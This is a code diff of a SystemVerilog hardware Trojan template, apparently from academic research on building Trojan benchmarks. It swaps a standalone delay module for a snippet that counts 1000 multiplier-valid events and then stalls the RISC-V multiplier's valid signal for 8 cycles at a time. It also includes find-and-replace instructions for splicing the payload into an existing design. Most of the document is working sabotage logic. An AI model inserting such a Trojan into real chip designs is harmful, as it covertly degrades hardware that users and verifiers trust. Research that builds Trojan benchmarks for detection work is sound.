@@ -1,61 +1,73 @@
 /**
- * Hardware Trojan Template: Performance Degradation (Availability Attack)
+ * Sequential Availability Trojan - Code Snippet
  * 
- * Category: Sequential Logic
- * Pattern Type: Performance Degradation / Availability
- * 
- * Source: Boraten & Kodi (2016), Hoque et al. (2020)
- * Reference:
- *   [1] T. Boraten, "Performance degradation attacks in NoC," IEEE IPDPS 2016
- *   [2] T. Hoque et al., "Hardware trojan attacks in embedded memory," ACM JETC 2020
+ * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
+ * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
  * 
  * Description:
- *   Degrades system performance through artificial delays in Load/Store Unit.
- *   Creates pipeline bubbles by stalling critical signals.
- *
- * RISC-V Adaptation:
- *   Targets LSU timing-critical paths:
- *   - lsu_req_valid_o, lsu_resp_valid_o
- *   - data_rvalid_i, data_gnt_i
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Degrades performance through artificial delays
+ *   
+ * Trigger: Counter on mult_valid_i
+ * Payload: Delay mult_valid_i by N cycles
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module mult_trojan (
-    input  logic clk_i,
-    input  logic rst_ni,
-    
-    input  logic fu_data_t,
-    input  logic {{NORMAL_VALID}},
-    output logic {{DELAYED_VALID}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Counter-based)
+// ============================================================
 
-    localparam int DELAY_CYCLES = 15;
-    
-    logic [7:0] delay_counter;
-    logic trojan_delay_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            delay_counter <= '0;
-            trojan_delay_active <= 1'b0;
-        end else begin
-            if (fu_data_t && {{NORMAL_VALID}}) begin
-                delay_counter <= DELAY_CYCLES;
-                trojan_delay_active <= 1'b1;
-            end
-            
-            if (delay_counter > 0) begin
-                delay_counter <= delay_counter - 1;
-            end else begin
-                trojan_delay_active <= 1'b0;
-            end
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [31:0] trojan_counter;
+logic trojan_active;
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        if (mult_valid_i) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
         end
     end
-    
-    assign {{DELAYED_VALID}} = trojan_delay_active ? 
-                               1'b0 : 
-                               {{NORMAL_VALID}};
+end
 
-endmodule
+// ============================================================
+// PAYLOAD: Performance Degradation
+// ============================================================
+
+// Delay counter for performance degradation
+localparam int DELAY_CYCLES = 8;
+logic [3:0] delay_counter;
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        delay_counter <= '0;
+    end else begin
+        if (trojan_active && mult_valid_i) begin
+            delay_counter <= DELAY_CYCLES;
+        end else if (delay_counter > 0) begin
+            delay_counter <= delay_counter - 1;
+        end
+    end
+end
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Performance Degradation: Delay mult_valid_i by DELAY_CYCLES
+//
+// Integration Script Must Modify:
+//
+// IF mult_valid_i is a ready/valid signal:
+//   Find: assign mult_valid_i = ready_condition;
+//   Replace: assign mult_valid_i = (delay_counter == 0) ? ready_condition : 1'b0;
+//
+// IF mult_valid_i is in always_ff:
+//   Find: mult_valid_i <= ready_value;
+//   Replace: mult_valid_i <= (delay_counter == 0) ? ready_value : 1'b0;
